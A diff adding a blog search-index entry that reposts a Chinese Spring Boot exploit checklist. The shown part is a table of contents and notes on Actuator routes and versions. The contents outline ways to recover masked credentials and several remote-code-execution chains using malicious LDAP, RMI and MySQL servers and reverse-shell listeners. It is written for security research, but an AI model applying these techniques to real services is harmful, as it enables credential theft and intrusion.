@@ -1134,4 +1134,1075 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
 ]]></content>
   </entry>
+  <entry>
+    <title>Spring Boot Vulnerability Exploit Check List</title>
+    <url>/2021/04/29/Spring-Boot-Vulnerability-Exploit-Check-List/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文转载自<a href="https://github.com/LandGrey/SpringBootVulExploit">LandGrey/SpringBootVulExploit</a>，在此膜拜大佬。</p>
+<hr>
+<h1 id="Spring-Boot-Vulnerability-Exploit-Check-List"><a href="#Spring-Boot-Vulnerability-Exploit-Check-List" class="headerlink" title="Spring Boot Vulnerability Exploit Check List"></a>Spring Boot Vulnerability Exploit Check List</h1><p>Spring Boot 相关漏洞学习资料，利用方法和技巧合集，黑盒安全评估 check list</p>
+<a id="more"></a>
+
+<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><blockquote>
+<p><strong>⚠️ 本项目所有内容仅作为安全研究和授权测试使用, 相关人员对因误用和滥用该项目造成的一切损害概不负责</strong></p>
+</blockquote>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#spring-boot-vulnerability-exploit-check-list">Spring Boot Vulnerability Exploit Check List</a><ul>
+<li><a href="#%E5%A3%B0%E6%98%8E">声明</a></li>
+<li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li>
+<li><a href="#%E9%9B%B6%E8%B7%AF%E7%94%B1%E5%92%8C%E7%89%88%E6%9C%AC">零：路由和版本</a><ul>
+<li><a href="#0x01%E8%B7%AF%E7%94%B1%E7%9F%A5%E8%AF%86">0x01：路由知识</a></li>
+<li><a href="#0x02%E7%89%88%E6%9C%AC%E7%9F%A5%E8%AF%86">0x02：版本知识</a><ul>
+<li><a href="#%E7%BB%84%E4%BB%B6%E7%89%88%E6%9C%AC%E7%9A%84%E7%9B%B8%E4%BA%92%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">组件版本的相互依赖关系：</a></li>
+<li><a href="#spring-cloud-%E4%B8%8E-spring-boot-%E7%89%88%E6%9C%AC%E4%B9%8B%E9%97%B4%E7%9A%84%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB">Spring Cloud 与 Spring Boot 版本之间的依赖关系：</a></li>
+<li><a href="#spring-cloud-%E5%B0%8F%E7%89%88%E6%9C%AC%E5%8F%B7%E7%9A%84%E5%90%8E%E7%BC%80%E5%8F%8A%E5%90%AB%E4%B9%89">Spring Cloud 小版本号的后缀及含义:</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%B8%80%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">一：信息泄露</a><ul>
+<li><a href="#0x01%E8%B7%AF%E7%94%B1%E5%9C%B0%E5%9D%80%E5%8F%8A%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8%E8%AF%A6%E6%83%85%E6%B3%84%E6%BC%8F">0x01：路由地址及接口调用详情泄漏</a></li>
+<li><a href="#0x02%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E8%80%8C%E6%9A%B4%E9%9C%B2%E7%9A%84%E8%B7%AF%E7%94%B1">0x02：配置不当而暴露的路由</a></li>
+<li><a href="#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80">0x03：获取被星号脱敏的密码的明文 (方法一)</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D">步骤一： 找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-jolokia-%E8%B0%83%E7%94%A8%E7%9B%B8%E5%85%B3-mbean-%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87">步骤二： jolokia 调用相关 Mbean 获取明文</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x04%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%BA%8C">0x04：获取被星号脱敏的密码的明文 (方法二)</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-1">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-1">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-1">步骤一： 找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82">步骤二： 使用 nc 监听 HTTP 请求</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三： 设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四： 刷新配置</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94-%E8%A7%A3%E7%A0%81%E5%B1%9E%E6%80%A7%E5%80%BC">步骤五： 解码属性值</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x05%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%89">0x05：获取被星号脱敏的密码的明文 (方法三)</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-2">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-2">步骤一： 找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%BD%BF%E7%94%A8-nc-%E7%9B%91%E5%90%AC-http-%E8%AF%B7%E6%B1%82-1">步骤二： 使用 nc 监听 HTTP 请求</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E8%A7%A6%E5%8F%91%E5%AF%B9%E5%A4%96-http-%E8%AF%B7%E6%B1%82">步骤三： 触发对外 http 请求</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1">步骤四： 刷新配置</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#0x06%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E5%9B%9B">0x06：获取被星号脱敏的密码的明文 (方法四)</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-3">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-3">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%BE%E5%88%B0%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%9A%84%E5%B1%9E%E6%80%A7%E5%90%8D-3">步骤一： 找到想要获取的属性名</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E4%B8%8B%E8%BD%BD-jvm-heap-%E4%BF%A1%E6%81%AF">步骤二： 下载 jvm heap 信息</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E4%BD%BF%E7%94%A8-mat-%E8%8E%B7%E5%BE%97-jvm-heap-%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87">步骤三： 使用 MAT 获得 jvm heap 中的密码明文</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%BA%8C%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">二：远程代码执行</a><ul>
+<li><a href="#0x01whitelabel-error-page-spel-rce">0x01：whitelabel error page SpEL RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-4">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-4">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E6%AD%A3%E5%B8%B8%E4%BC%A0%E5%8F%82%E5%A4%84">步骤一：找到一个正常传参处</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%A7%E8%A1%8C-spel-%E8%A1%A8%E8%BE%BE%E5%BC%8F">步骤二：执行 SpEL 表达式</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x02spring-cloud-snakeyaml-rce">0x02：spring cloud SnakeYAML RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-5">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-5">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80-%E6%89%98%E7%AE%A1-yml-%E5%92%8C-jar-%E6%96%87%E4%BB%B6">步骤一： 托管 yml 和 jar 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C-%E8%AE%BE%E7%BD%AE-springcloudbootstraplocation-%E5%B1%9E%E6%80%A7">步骤二： 设置 spring.cloud.bootstrap.location 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89-%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤三： 刷新配置</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-1">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x03eureka-xstream-deserialization-rce">0x03：eureka xstream deserialization RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-6">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-6">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9E%B6%E8%AE%BE%E5%93%8D%E5%BA%94%E6%81%B6%E6%84%8F-xstream-payload-%E7%9A%84%E7%BD%91%E7%AB%99">步骤一：架设响应恶意 XStream payload 的网站</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤二：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-eurekaclientserviceurldefaultzone-%E5%B1%9E%E6%80%A7">步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE">步骤四：刷新配置</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-2">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x04jolokia-logback-jndi-rce">0x04：jolokia logback JNDI RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-7">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-7">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans">步骤一：查看已存在的 MBeans</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6">步骤二：托管 xml 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤三：准备要执行的 Java 代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 ldap 服务</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3">步骤五：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E4%BB%8E%E5%A4%96%E9%83%A8-url-%E5%9C%B0%E5%9D%80%E5%8A%A0%E8%BD%BD%E6%97%A5%E5%BF%97%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">步骤六：从外部 URL 地址加载日志配置文件</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-3">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x05jolokia-realm-jndi-rce">0x05：jolokia Realm JNDI RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-8">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-8">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E5%B7%B2%E5%AD%98%E5%9C%A8%E7%9A%84-mbeans-1">步骤一：查看已存在的 MBeans</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81">步骤二：准备要执行的 Java 代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6">步骤三：托管 class 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rmi-%E6%9C%8D%E5%8A%A1">步骤四：架设恶意 rmi 服务</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-1">步骤五：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E9%80%81%E6%81%B6%E6%84%8F-payload">步骤六：发送恶意 payload</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-4">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x06restart-h2-database-query-rce">0x06：restart h2 database query RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-9">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-9">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BE%E7%BD%AE-springdatasourcehikariconnection-test-query-%E5%B1%9E%E6%80%A7">步骤一：设置 spring.datasource.hikari.connection-test-query 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤二：重启应用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-5">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-5">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x07h2-database-console-jndi-rce">0x07：h2 database console JNDI RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-10">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-10">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E8%AE%BF%E9%97%AE%E8%B7%AF%E7%94%B1%E8%8E%B7%E5%BE%97-jsessionid">步骤一：访问路由获得 jsessionid</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E5%87%86%E5%A4%87%E8%A6%81%E6%89%A7%E8%A1%8C%E7%9A%84-java-%E4%BB%A3%E7%A0%81-1">步骤二：准备要执行的 Java 代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E6%89%98%E7%AE%A1-class-%E6%96%87%E4%BB%B6-1">步骤三：托管 class 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1-1">步骤四：架设恶意 ldap 服务</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9-shell-%E7%9A%84%E7%AB%AF%E5%8F%A3-2">步骤五：监听反弹 shell 的端口</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E5%8F%91%E5%8C%85%E8%A7%A6%E5%8F%91-jndi-%E6%B3%A8%E5%85%A5">步骤六：发包触发 JNDI 注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-6">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-6">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x08mysql-jdbc-deserialization-rce">0x08：mysql jdbc deserialization RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-11">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-11">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E4%BE%9D%E8%B5%96">步骤一：查看环境依赖</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%9E%B6%E8%AE%BE%E6%81%B6%E6%84%8F-rogue-mysql-server">步骤二：架设恶意 rogue mysql server</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-springdatasourceurl-%E5%B1%9E%E6%80%A7">步骤三：设置 spring.datasource.url 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E5%88%B7%E6%96%B0%E9%85%8D%E7%BD%AE-1">步骤四：刷新配置</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%94%E8%A7%A6%E5%8F%91%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9F%A5%E8%AF%A2">步骤五：触发数据库查询</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%85%AD%E6%81%A2%E5%A4%8D%E6%AD%A3%E5%B8%B8-jdbc-url">步骤六：恢复正常 jdbc url</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-6">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-7">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-7">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x09restart-loggingconfig-logback-jndi-rce">0x09：restart logging.config logback JNDI RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-12">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-12">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-xml-%E6%96%87%E4%BB%B6">步骤一：托管 xml 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E6%89%98%E7%AE%A1%E6%81%B6%E6%84%8F-ldap-%E6%9C%8D%E5%8A%A1%E5%8F%8A%E4%BB%A3%E7%A0%81">步骤二：托管恶意 ldap 服务及代码</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E8%AE%BE%E7%BD%AE-loggingconfig-%E5%B1%9E%E6%80%A7">步骤三：设置 logging.config 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E5%9B%9B%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤四：重启应用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-7">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-8">漏洞分析：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-8">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x0arestart-loggingconfig-groovy-rce">0x0A：restart logging.config groovy RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-13">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-13">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-groovy-%E6%96%87%E4%BB%B6">步骤一：托管 groovy 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-loggingconfig-%E5%B1%9E%E6%80%A7">步骤二：设置 logging.config 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8">步骤三：重启应用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-8">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-9">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x0brestart-springmainsources-groovy-rce">0x0B：restart spring.main.sources groovy RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-14">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-14">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-groovy-%E6%96%87%E4%BB%B6-1">步骤一：托管 groovy 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springmainsources-%E5%B1%9E%E6%80%A7">步骤二：设置 spring.main.sources 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8-1">步骤三：重启应用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-9">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-10">漏洞环境：</a></li>
+</ul>
+</li>
+<li><a href="#0x0crestart-springdatasourcedata-h2-database-rce">0x0C：restart spring.datasource.data h2 database RCE</a><ul>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-15">利用条件：</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95-15">利用方法：</a><ul>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%80%E6%89%98%E7%AE%A1-sql-%E6%96%87%E4%BB%B6">步骤一：托管 sql 文件</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%BA%8C%E8%AE%BE%E7%BD%AE-springdatasourcedata-%E5%B1%9E%E6%80%A7">步骤二：设置 spring.datasource.data 属性</a></li>
+<li><a href="#%E6%AD%A5%E9%AA%A4%E4%B8%89%E9%87%8D%E5%90%AF%E5%BA%94%E7%94%A8-2">步骤三：重启应用</a></li>
+</ul>
+</li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-10">漏洞原理：</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83-11">漏洞环境：</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="零：路由和版本"><a href="#零：路由和版本" class="headerlink" title="零：路由和版本"></a>零：路由和版本</h2><h3 id="0x01：路由知识"><a href="#0x01：路由知识" class="headerlink" title="0x01：路由知识"></a>0x01：路由知识</h3><ul>
+<li>有些程序员会自定义 <code>/manage</code>、<code>/management</code> 、<strong>项目 App 相关名称</strong>为 spring 根路径</li>
+<li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为  <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li>
+<li>Spring Boot Actuator 默认的内置路由名字，如 <code>/env</code> 有时候也会被程序员修改，比如修改成 <code>/appenv</code></li>
+</ul>
+<h3 id="0x02：版本知识"><a href="#0x02：版本知识" class="headerlink" title="0x02：版本知识"></a>0x02：版本知识</h3><blockquote>
+<p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p>
+</blockquote>
+<h4 id="组件版本的相互依赖关系："><a href="#组件版本的相互依赖关系：" class="headerlink" title="组件版本的相互依赖关系："></a>组件版本的相互依赖关系：</h4><table>
+<thead>
+<tr>
+<th>依赖项</th>
+<th>版本列表及依赖组件版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>spring-boot-starter-parent</td>
+<td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td>
+</tr>
+<tr>
+<td>spring-boot-dependencies</td>
+<td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td>
+</tr>
+<tr>
+<td>spring-cloud-dependencies</td>
+<td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td>
